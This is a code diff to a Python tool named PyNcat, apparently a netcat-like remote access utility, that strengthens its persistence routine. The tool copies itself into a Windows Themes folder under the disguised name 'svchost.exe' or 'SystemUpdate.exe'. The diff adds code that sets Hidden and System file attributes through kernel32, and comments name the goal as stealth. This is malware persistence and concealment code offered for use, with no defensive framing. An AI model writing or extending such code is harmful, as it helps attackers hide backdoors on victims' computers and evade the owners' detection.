@@ -48,7 +48,7 @@ class PyNcat:
 
         # ====================== PERSISTENCE ======================
     def self_copy_to_hidden(self) -> str:
-        """Copy itself to hidden location and return the new path"""
+        """Copy itself to hidden location + apply +H +S attributes on Windows"""
         original_path = os.path.abspath(sys.argv[0])
         system = platform.system().lower()
 
@@ -56,6 +56,8 @@ class PyNcat:
             if system == "windows":
                 hidden_dir = os.path.join(os.getenv('APPDATA', ''), r"Microsoft\Windows\Themes")
                 os.makedirs(hidden_dir, exist_ok=True)
+                
+                # More stealthy name
                 new_name = "SystemUpdate.exe" if original_path.lower().endswith(('.py','.pyc')) else "svchost.exe"
                 hidden_path = os.path.join(hidden_dir, new_name)
 
@@ -70,13 +72,24 @@ class PyNcat:
             import shutil
             if os.path.exists(hidden_path):
                 os.remove(hidden_path)
-            
+
             shutil.copy2(original_path, hidden_path)
-            
-            if system == "linux":
+
+            # === FILE ATTRIBUTE HIDING ===
+            if system == "windows":
+                try:
+                    import ctypes
+                    kernel32 = ctypes.windll.kernel32
+                    # +H (Hidden) +S (System)
+                    kernel32.SetFileAttributesW(hidden_path, 0x2 | 0x4)  
+                    logger.info(f"[+] Applied Hidden + System attributes to: {hidden_path}")
+                except Exception as e:
+                    logger.warning(f"Could not set file attributes: {e}")
+
+            elif system == "linux":
                 os.chmod(hidden_path, 0o755)
 
-            logger.info(f"[+] Self-copied to hidden location: {hidden_path}")
+            logger.info(f"[+] Self-copied to stealthy location: {hidden_path}")
             return hidden_path
 
         except Exception as e:
